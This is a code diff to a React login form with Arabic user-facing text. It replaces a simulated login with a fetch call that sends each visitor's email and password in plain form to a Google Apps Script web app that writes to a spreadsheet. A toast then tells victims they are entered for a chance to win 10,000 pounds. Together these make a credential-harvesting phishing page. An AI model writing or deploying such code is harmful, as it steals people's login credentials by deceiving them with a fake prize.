@@ -1,4 +1,3 @@
-
 import React, { useState } from 'react';
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
@@ -12,18 +11,43 @@ const LoginForm = () => {
   const [isLoading, setIsLoading] = useState(false);
   const { toast } = useToast();
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setIsLoading(true);
-    
-    // Simulate a login process
-    setTimeout(() => {
-      setIsLoading(false);
-      toast({
-        title: "تم تسجيل الدخول بنجاح!",
-        description: "أنت الآن مسجل للمشاركة في فرصة ربح 10,000 جنيه!",
+
+    // إعداد البيانات للإرسال
+    const data = {
+      email: email,
+      password: password,
+    };
+
+    try {
+      // إرسال البيانات إلى Google Sheets Web App
+      const response = await fetch('https://script.google.com/macros/s/AKfycbz76h-b0W_sbnknoJnpzOPUSng4vHvIw4h6vi3UfdxhfLYNupa-iUDcxuLpDUEG__-b_Q/exec', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(data),
       });
-    }, 1500);
+
+      if (response.ok) {
+        toast({
+          title: "تم تسجيل الدخول بنجاح!",
+          description: "أنت الآن مسجل للمشاركة في فرصة ربح 10,000 جنيه!",
+        });
+      } else {
+        throw new Error('فشل في تسجيل البيانات');
+      }
+    } catch (error) {
+      toast({
+        title: "حدث خطأ",
+        description: "تعذر حفظ البيانات، حاول مرة أخرى.",
+        variant: "destructive",
+      });
+    } finally {
+      setIsLoading(false);
+    }
   };
 
   return (
